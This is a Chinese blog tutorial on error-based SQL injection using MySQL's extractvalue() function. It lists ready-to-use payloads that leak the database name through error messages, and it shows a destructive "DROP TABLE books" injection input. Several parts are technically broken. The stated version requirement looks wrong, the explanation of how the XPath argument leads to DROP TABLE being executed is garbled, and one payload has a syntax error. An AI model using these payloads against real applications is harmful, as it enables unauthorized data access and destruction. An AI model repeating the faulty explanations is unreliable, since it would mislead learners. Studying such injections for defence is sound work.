# 原创
：  【sql注入-报错注入1】extractvalue()函数 报错注入

# 【sql注入-报错注入1】extractvalue()函数 报错注入

**目录**

[extractvalue()报错注入](#extractvalue%28%29%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5)

[一、语法介绍：](#%E4%B8%80%E3%80%81%E8%AF%AD%E6%B3%95%E4%BB%8B%E7%BB%8D%EF%BC%9A)

[二、报错原因](#%E4%BA%8C%E3%80%81%E6%8A%A5%E9%94%99%E5%8E%9F%E5%9B%A0)

[网络安全小圈子](#%E4%B8%89%E3%80%81%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%B0%8F%E5%9C%88%E5%AD%90)

---


（***注：注意看版本要求）

## extractvalue()报错注入

### 一、语法介绍：

版本：

MySQL&lt;5.0.x

---


语法：

EXTRACTVALUE(xml_expression, xpath_expression)

xml_expression是一个XML类型的字段或表达式，xpath_expression是一个XPath表达式，用于指定要提取的节点。

---


原理：
1. 首先，函数会对xml_expression进行解析，将其转换为一个XML文档对象。1. 然后，函数使用xpath_expression指定的路径来定位要提取的节点。1. 最后，函数返回找到的节点的值
---


使用：

假设一个XML类型的字段xml_data，如下

```
&lt;book&gt;
  &lt;title&gt;Harry Potter&lt;/title&gt;
  &lt;author&gt;J.K. Rowling&lt;/author&gt;
  &lt;year&gt;2001&lt;/year&gt;
&lt;/book&gt;
```

可以使用extractvalue()函数来提取其中的节点值，如下

```
SELECT EXTRACTVALUE(xml_data, '/book/title') AS title,
       EXTRACTVALUE(xml_data, '/book/author') AS author,
       EXTRACTVALUE(xml_data, '/book/year') AS yearFROM books;
```

上述SQL语句将从xml_data字段中提取出"title"、"author"和"year"节点的值，然后将其作为结果集返回

---


---


### 二、报错原因

产生原因：

在extractvalue()函数中，如果xpath_expression参数可以由用户输入控制，攻击者可以构造恶意的XPath表达式，从而执行注入攻击。例如，攻击者可以构造一个恶意的输入，使得xpath_expression参数成为一个恶意的SQL语句。

---


示例：

```
SELECT * FROM books WHERE title = EXTRACTVALUE(xml_data, '/book/title')
```

如果xpath_expression参数可以由用户输入控制，攻击者可以构造一个恶意的输入，例如：

```
'; DROP TABLE books; --
```

这样，最终构造出的XPath表达式为：

```
/book/title'; DROP TABLE books; --
```

当该恶意输入被传递给extractvalue()函数时，它会将恶意的XPath表达式作为参数执行。由于XPath表达式中包含了一个SQL注释符（--），后续的SQL语句将被忽略，从而导致DROP TABLE books语句被执行，删除了books表。

---


payload：

```
and (extractvalue(1,concat('~'(select database()))));

and (extractvalue('anything',concat('/',(select database()))));

and (extractvalue('anything',concat('~',substring((select database()),1,5))));

and extractvalue(1,concat(0x7e,(select database()),0x7e))#
```

---


---


## 网络安全小圈子

[README.md · 书半生/网络安全知识体系-实战中心 - 码云 - 开源中国 (gitee.com)<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.3.2/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=N5K3"/>https://gitee.com/shubansheng/Treasure_knowledge/blob/master/README.md](https://gitee.com/shubansheng/Treasure_knowledge/blob/master/README.md)

[GitHub - BLACKxZONE/Treasure_knowledge<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.3.2/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=N5K3"/>https://github.com/BLACKxZONE/Treasure_knowledge](https://github.com/BLACKxZONE/Treasure_knowledge)
